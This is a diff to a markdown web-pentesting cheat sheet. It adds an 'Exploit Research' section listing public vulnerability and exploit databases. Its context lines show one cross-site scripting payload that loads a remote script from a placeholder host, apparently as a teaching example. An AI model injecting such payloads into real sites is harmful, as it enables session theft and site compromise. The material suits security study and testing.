@@ -8,6 +8,7 @@ Overview
 4. - [HTML Injection](#4---html-injection)
 5. - [Cross-Site Scripting (XSS)](#5---cross-site-scripting-xss)
 6. - [Cross-Site Request Forgery (CSRF)](#6---cross-site-request-forgery-csrf)
+7. - [Exploit Research](#7---exploit-research)
 
    
 #1. - Web Requests
@@ -105,4 +106,43 @@ CTRL + U
 
 ```
 "><script src=//www.example.com/exploit.js></script>
+```
+
+#6. - Exploit Research
+-----------------------------------------
+
+- CVEdetails
+
+```
+https://www.cvedetails.com/
+```
+
+- Exploit DB
+
+```
+https://www.exploit-db.com/
+```
+
+- Vulners
+
+```
+https://vulners.com/
+```
+
+- Rapid7
+
+```
+https://www.rapid7.com/db/
+```
+
+- Vulnerability Lab
+
+```
+https://www.vulnerability-lab.com/
+```
+
+- Packet Storm Security
+
+```
+https://packetstormsecurity.com/
 ```
